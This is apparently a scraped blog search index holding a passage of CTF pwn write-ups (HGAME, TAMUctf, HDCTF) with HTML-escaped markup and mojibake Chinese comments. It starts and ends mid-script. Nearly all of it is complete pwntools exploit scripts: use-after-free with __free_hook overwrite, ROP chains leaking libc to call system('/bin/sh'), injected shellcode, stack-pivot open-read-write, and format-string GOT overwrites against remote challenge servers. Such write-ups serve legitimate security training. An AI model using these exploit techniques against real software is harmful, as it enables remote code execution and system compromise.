    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)    
# pause()
    
for i in range(8):
    add(i,0x80)  
#8å—ï¼Œå‰7å—freeå¡«æ»¡tcachebin,æœ€åä¸€å—freeè¿›å…¥unsortedbin
add(8,0x10)
#é˜²æ­¢unlinkä¸top_chunkåˆå¹¶
for i in range(8):
    delete(i)
    
show(7) #uaf
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x60-0x1ECB80
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

edit(6,p64(free_hook))
add(9,0x80)
add(10,0x80)
edit(10,p64(sys_addr))

add(11,0x20)
edit(11,b&amp;quot;/bin/sh&amp;quot;)
delete(11)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;new_fast_note&#34;&gt;new_fast_note:&lt;/h3&gt;
&lt;p&gt;æ­¤é¢˜å­˜åœ¨uafï¼Œæ²¡æœ‰editå‡½æ•°ï¼Œå¯ä»¥åˆ©ç”¨house of botcakeåˆ›é€ chunk overlapæ¥å®ç°ä»»æ„åœ°å€åˆ†é…ï¼ŒåŠ«æŒfree_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;house of botcakeï¼š
ç»•è¿‡ tcache-&amp;gt;key çš„æ£€æŸ¥ï¼š

ç”³è¯· 7 ä¸ªå¤§å°ç›¸åŒï¼Œå¤§å°å¤§äº 0x80 çš„ chunkï¼Œå†ç”³è¯·ä¸‰ä¸ªï¼Œåˆ†åˆ«ä¸º chunk A å’Œ chunkB å’Œ chunk C
é‡Šæ”¾å‰ 7 ä¸ªå’Œ chunk Aï¼Œå‰é¢ 7 ä¸ªéƒ½ä¼šè¿›å…¥åˆ° tcachebin é‡Œé¢ï¼Œchunk A è¿›å…¥åˆ° unsortedbin
é‡Šæ”¾ chunk Bï¼Œåˆ™ chunk B ä¼šå’Œ chunk A åˆå¹¶
ä» tcachebin åˆ†é…èµ°ä¸€ä¸ª
å†æ¬¡é‡Šæ”¾ chunk Bï¼Œæ­¤æ—¶ B åŒæ—¶å­˜åœ¨ä¸ unsortedbin å’Œ tcachebin
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(b&amp;quot;node3.anna.nssctf.cn&amp;quot;,28740)
# io=process(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    io.sendafter(b&amp;quot;Content: &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
        
# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x90,b&amp;quot;/bin/sh&amp;quot;)

add(8,0x90,b&amp;quot;/bin/sh&amp;quot;)
add(9,0x90,b&amp;quot;/bin/sh&amp;quot;)
add(10,0x10,b&amp;quot;/bin/sh&amp;quot;)

for i in range(8):
    delete(i)
    
show(7)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x60-0x1ECB80
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]

delete(8)

add(11,0x90,b&amp;quot;/bin/sh&amp;quot;)

delete(8)

add(12,0xc0,cyclic(0xa0)+p64(free_hook))
add(13,0x90,b&amp;quot;qqq&amp;quot;)
add(14,0x90,p64(sys_addr))

delete(11)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">HGAME week2 å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/YqcmcWPUD/"" data-c="
          &lt;h2 id=&#34;pwn&#34;&gt;PWN:&lt;/h2&gt;
&lt;h3 id=&#34;inspector-gadget&#34;&gt;inspector-&lt;strong&gt;gadget&lt;/strong&gt;:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./inspector-gadget&amp;quot;)
io=remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;inspector-gadget&amp;quot;)
elf=ELF(&amp;quot;./inspector-gadget&amp;quot;)
libc=ELF(&amp;quot;./libc.so&amp;quot;)

me=0x4011a3
pop_rdi_ret=0x40127b
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

io.recvuntil(b&amp;quot;pwn me\n&amp;quot;)
payload=cyclic(0x18)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(me)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
payload=cyclic(0x18)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)

io.recvuntil(b&amp;quot;pwn me\n&amp;quot;)
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000401274 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401276 : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401278 : pop r14 ; pop r15 ; ret
# 0x000000000040127a : pop r15 ; ret
# 0x0000000000401273 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401277 : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000401129 : pop rbp ; ret
# 0x000000000040127b : pop rdi ; ret
# 0x0000000000401279 : pop rsi ; pop r15 ; ret
# 0x0000000000401275 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401016 : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;randomness&#34;&gt;randomnessï¼š&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./randomness&amp;quot;)
io = remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;randomness&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

puts_got=0x403448
win=0x4011d3

io.recvuntil(b&amp;quot;seed:\n&amp;quot;)
io.sendline(str(puts_got))
cs.srand(0)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;guess:\n&amp;quot;)
# io.sendline(str(cs.rand()))
payload=str(win)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;sea-shells&#34;&gt;sea-shells:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./sea-shells&amp;quot;)
io = remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;sea-shells&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
# sc=b&amp;quot;\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05&amp;quot;
sc=asm(shellcraft.sh())

io.recvuntil(b&amp;quot;1st number: &amp;quot;)
io.sendline(b&amp;quot;0&amp;quot;)

io.recvuntil(b&amp;quot;2nd number: &amp;quot;)
io.sendline(b&amp;quot;0&amp;quot;)

io.recvuntil(b&amp;quot;3rd number: &amp;quot;)
io.sendline(b&amp;quot;0&amp;quot;)

io.recvuntil(b&amp;quot;4th number: &amp;quot;)
io.sendline(str(cs.rand()))

io.recvuntil(b&amp;quot;work: &amp;quot;)
leak_addr=int(io.recv(12),16)
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;again? (y/n) &amp;quot;)
# io.sendline(b&amp;quot;n&amp;quot;)

payload=b&amp;quot;n&amp;quot;+p64(0)+p64(0)+p64(leak_addr+0x40)+sc
io.sendline(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000000131d : leave ; ret
# 0x0000000000001424 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001426 : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001428 : pop r14 ; pop r15 ; ret
# 0x000000000000142a : pop r15 ; ret
# 0x0000000000001423 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001427 : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000000115f : pop rbp ; ret
# 0x000000000000142b : pop rdi ; ret
# 0x0000000000001429 : pop rsi ; pop r15 ; ret
# 0x0000000000001425 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000001016 : ret
# 0x0000000000001072 : ret 0x2f
# 0x000000000000128a : ret 0x8948

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;unlucky&#34;&gt;unlucky:&lt;/h3&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

while True:
    try:
        # io=process(&amp;quot;./unlucky&amp;quot;)
        io = remote(&amp;quot;tamuctf.com&amp;quot;, 443, ssl=True, sni=&amp;quot;unlucky&amp;quot;)
        elf=ELF(&amp;quot;./unlucky&amp;quot;)
        cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
        # gdb.attach(io)
        # pause()
        io.recvuntil(b&amp;quot;: &amp;quot;)
        seed_addr=int(io.recv(15),16)
        print(&amp;quot;seed_addr: &amp;quot;+hex(seed_addr))
        seed_addr+=0x2ec3
        # num=c_int(69)
        # seed_addr = addressof(num)
        print(&amp;quot;seed_addr: &amp;quot;+hex(seed_addr))
        
        cs.srand(seed_addr)
        for i in range(7):
            io.recvuntil(b&amp;quot;:\n&amp;quot;)
            io.sendline(str(cs.rand()))
        
        io.recvline()
        io.interactive()
    except:
        io.close()
        continue
&lt;/code&gt;&lt;/pre&gt;
">TAMU wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/eUNOoLG_j/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNï¼š&lt;/h3&gt;
&lt;h4 id=&#34;easy_overflow&#34;&gt;easy_overflowï¼š&lt;/h4&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28949)

ret=0x40101a
payload=cyclic(0x18)+p64(ret)+p64(0x401176)
io.send(payload)
io.sendline(b&amp;quot;exec 1&amp;gt;&amp;amp;0&amp;quot;)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;enter-the-pwn-land&#34;&gt;enter the pwn land:&lt;/h4&gt;
&lt;p&gt;æ³¨æ„å˜é‡ä¼šè¢«è¾“å…¥è¦†ç›–&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28032)
# io=process(&amp;quot;./service&amp;quot;)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;./libc1.so&amp;quot;)

puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
ret=0x40101a
pop_rdi_ret=0x401313
start=0x4010d0

payload=cyclic(0x28)+p32(1)+p32(0x2c)+p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(start)
io.sendline(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr:  &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))

sys_addr=libc_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=libc_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

payload=cyclic(0x28)+p32(1)+p32(0x2c)+p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
io.sendline(payload)

io.interactive()
# Gadgets information
# ============================================================
# 0x000000000040130c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040130e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401310 : pop r14 ; pop r15 ; ret
# 0x0000000000401312 : pop r15 ; ret
# 0x000000000040130b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040130f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401313 : pop rdi ; ret
# 0x0000000000401311 : pop rsi ; pop r15 ; ret
# 0x000000000040130d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 11
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;simple_shellcode&#34;&gt;simple_shellcode:&lt;/h4&gt;
&lt;p&gt;æº¢å‡ºé•¿åº¦ä¸å¤Ÿï¼Œæ„é€ readè¯»orw shellcodeï¼Œæ³¨æ„shellcodeèµ·å§‹åœ°å€&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28491)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;shellcode:\n&amp;quot;)
shellcode=asm(&#39;&#39;&#39;
    xor rdi,rdi
    mov rsi,0xCAFE0010
    syscall
    nop
&#39;&#39;&#39;)
io.send(shellcode)
payload=asm(shellcraft.open(&amp;quot;./flag&amp;quot;)+shellcraft.read(3,0xCAFE0000,0x50)+shellcraft.write(1,0xCAFE0000,0x50))
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;orw&#34;&gt;orw:&lt;/h4&gt;
&lt;p&gt;ç¬¬ä¸€æ¬¡è¾“å…¥æ³„éœ²libcï¼Œç¬¬äºŒæ¬¡æ ˆè¿ç§»åŠ«æŒrspå¯„å­˜å™¨ï¼Œ&lt;s&gt;æ³¨æ„è°ƒæ ˆé—®é¢˜=_=&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./vuln&amp;quot;)
io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28611)
elf=ELF(&amp;quot;./vuln&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

bss_addr=0x404300   #404220  
read_text=0x4012CF
main=0x4012f0
pop_rdi_ret=0x401393
ret=0x40101a
rsi_r15=0x401391
leave_ret=0x4012be
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]

io.recvuntil(b&amp;quot;task.\n&amp;quot;)
payload=cyclic(0x108)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
libc_addr=leak_addr-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;libc_addr:  &amp;quot;+hex(libc_addr))
open_addr=libc_addr+libc.sym[b&amp;quot;open&amp;quot;]
write_addr=libc_addr+libc.sym[b&amp;quot;write&amp;quot;]
read_addr=elf.plt[b&amp;quot;read&amp;quot;]
pop_rdx_ret=0x142c92+libc_addr
pop_rsi_ret=0x2601f+libc_addr


# gdb.attach(io)
# pause()


io.recvuntil(b&amp;quot;task.\n&amp;quot;)
payload=cyclic(0x100)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x130,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=cyclic(0x100-0x8)+b&amp;quot;./flag\x00\x00&amp;quot;+p64(bss_addr+0x100+0x8+0x8)+p64(read_text)
payload=payload.ljust(0x130,b&amp;quot;a&amp;quot;)
io.send(payload)

#open
payload=p64(pop_rdi_ret)+p64(0x4042f8)+p64(pop_rsi_ret)+p64(0)+p64(open_addr)
#read
payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(bss_addr+0x300)+p64(pop_rdx_ret)+p64(0x50)+p64(read_addr)
#write
payload+=p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(bss_addr+0x300)+p64(pop_rdx_ret)+p64(0x50)+p64(write_addr)

payload=payload.ljust(0x100,b&amp;quot;\x00&amp;quot;)+p64(bss_addr+0x8)+p64(leave_ret)
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004012be : leave ; ret
# 0x000000000040138c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040138e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401390 : pop r14 ; pop r15 ; ret
# 0x0000000000401392 : pop r15 ; ret
# 0x000000000040138b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040138f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040117d : pop rbp ; ret
# 0x0000000000401393 : pop rdi ; ret
# 0x0000000000401391 : pop rsi ; pop r15 ; ret
# 0x000000000040138d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
# 0x00000000004012a8 : ret 0x2be

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
">HGAME week1 å¤ç°</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/wfsX-MIpi/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWNï¼š&lt;/h3&gt;
&lt;h4 id=&#34;pwnner&#34;&gt;Pwnnerï¼š&lt;/h4&gt;
&lt;p&gt;ä¼ªéšæœº+ret2text&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./pwnner&amp;quot;)
io=remote(&amp;quot;node5.anna.nssctf.cn&amp;quot;,28470)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

cs.srand(0x39)
io.recvuntil(b&amp;quot;name:\n&amp;quot;)
payload=cs.rand()
io.send(str(payload))
io.recvuntil(b&amp;quot;next?\n&amp;quot;)
payload=cyclic(0x48)+p64(0x4008b2)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;keep-on&#34;&gt;KEEP ON:&lt;/h4&gt;
&lt;p&gt;fmtarg+æ ˆè¿ç§»&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./hdctf&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28624)
elf=ELF(&amp;quot;./hdctf&amp;quot;)

read_text=0x4007D7
leave_ret=0x4007f2
pop_rdi_ret=0x4008d3
bss_addr=0x601800
main=0x400746
ret=0x4005b9

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;name: \n&amp;quot;)
io.send(b&amp;quot;%1$paaa./bin/sh\x00&amp;quot;)

io.recvuntil(b&amp;quot;,&amp;quot;)
sh=int(io.recv(14),16)+0x12
print(&amp;quot;sh: &amp;quot;+hex(sh))

io.recvuntil(b&amp;quot;keep on !\n&amp;quot;)
payload=cyclic(0x50)+p64(0x601900)+p64(read_text)
io.send(payload)
payload=p64(0)+p64(ret)+p64(pop_rdi_ret)+p64(sh)+p64(elf.sym[b&amp;quot;system&amp;quot;])
payload=payload.ljust(0x50,b&amp;quot;a&amp;quot;)+p64(0x601900-0x50)+p64(leave_ret)
io.send(payload)

io.interactive()


# Gadgets information
# ============================================================
# 0x00000000004007f2 : leave ; ret
# 0x00000000004008cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008ce : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008d0 : pop r14 ; pop r15 ; ret
# 0x00000000004008d2 : pop r15 ; ret
# 0x00000000004008cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004008cf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006b0 : pop rbp ; ret
# 0x00000000004008d3 : pop rdi ; ret
# 0x00000000004008d1 : pop rsi ; pop r15 ; ret
# 0x00000000004008cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005b9 : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;makewish&#34;&gt;Makewishï¼š&lt;/h4&gt;
&lt;p&gt;å­˜åœ¨æ ˆä¸Šoff by nullï¼Œä¼šå°†rbpæœ«å°¾æ›´æ”¹ä¸º&lt;code&gt;\x00&lt;/code&gt;ï¼Œå¯ä»¥æ ¹æ®è¿™ä¸€ç‚¹çˆ†ç ´retnåœ°å€ï¼Œä½¿ç”¨retæŠ¬é«˜æ ˆ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1682263550135.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./makewish&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28763)
elf=ELF(&amp;quot;./makewish&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)

shell=0x4007c7
ret=0x4005d9

io.recvuntil(b&amp;quot;name\n\n&amp;quot;)
io.sendline(b&amp;quot;a&amp;quot;*(0x28-1)+b&amp;quot;b&amp;quot;)
io.recvuntil(b&amp;quot;b\n&amp;quot;)

canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary:  &amp;quot;+hex(canary))

io.recvuntil(b&amp;quot;key\n\n&amp;quot;)
io.send(p32(cs.rand()%1000+324))

gdb.attach(io)
pause()

io.recvuntil(b&amp;quot;me\n&amp;quot;)
payload=p64(ret)*10+p64(shell)
payload=payload.ljust(0x58,b&amp;quot;a&amp;quot;)+p64(canary)
io.send(payload)
io.recvuntil(b&amp;quot;that\n&amp;quot;)

io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040098c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400990 : pop r14 ; pop r15 ; ret
# 0x0000000000400992 : pop r15 ; ret
# 0x000000000040098b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040098f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004006d0 : pop rbp ; ret
# 0x0000000000400993 : pop rdi ; ret
# 0x0000000000400991 : pop rsi ; pop r15 ; ret
# 0x000000000040098d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004005d9 : ret
# 0x000000000040087a : ret 0xd089
# 0x000000000040083a : ret 0xfffd

# Unique gadgets found: 13
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;minions&#34;&gt;Minionsï¼š&lt;/h4&gt;
&lt;p&gt;æ­¤é¢˜æ ˆè¿ç§»åˆ°bssæ®µä¸Šä¸è¡Œï¼Œè¿ç§»åè¿è¡Œé¡ºåºæ··ä¹±ï¼Œå¯è¿ç§»åˆ°æ ˆä¸Šï¼Œæ­¤é¢˜é€‰æ‹©åŠ«æŒgotè¡¨ï¼Œåˆ©ç”¨fmtstr_payloadå®ç°ä»»æ„åœ°å€å†™&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1682263742567.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./minions1&amp;quot;)
# io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28654)
elf=ELF(&amp;quot;./minions1&amp;quot;)

key=0x6010A0
printf_got=0x601030
hdctf_addr=0x6010C0
bss_addr=0x601300 
read_text=0x4007E8
leave_ret=0x400758
pop_rdi_ret=0x400893
ret=0x400581
main=0x400610

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;name?\n\n&amp;quot;)
payload=fmtstr_payload(6,{key:b&amp;quot;f&amp;quot;,hdctf_addr:b&amp;quot;/bin/sh\x00&amp;quot;})
io.send(payload)

io.recvuntil(b&amp;quot;you\n&amp;quot;)
payload=cyclic(0x38)+p64(main)
io.sendline(payload)

io.recvuntil(b&amp;quot;name?\n\n&amp;quot;)
payload=fmtstr_payload(6,{printf_got:elf.plt[b&amp;quot;system&amp;quot;]})
io.send(payload)

io.recvuntil(b&amp;quot;you\n&amp;quot;)
payload=cyclic(0x38)+p64(main)
io.sendline(payload)

io.recvuntil(b&amp;quot;name?\n\n&amp;quot;)
payload=b&amp;quot;/bin/sh\x00&amp;quot;
io.send(payload)

io.interactive()

# Gadgets information
# ============================================================
# 0x0000000000400758 : leave ; ret
# 0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
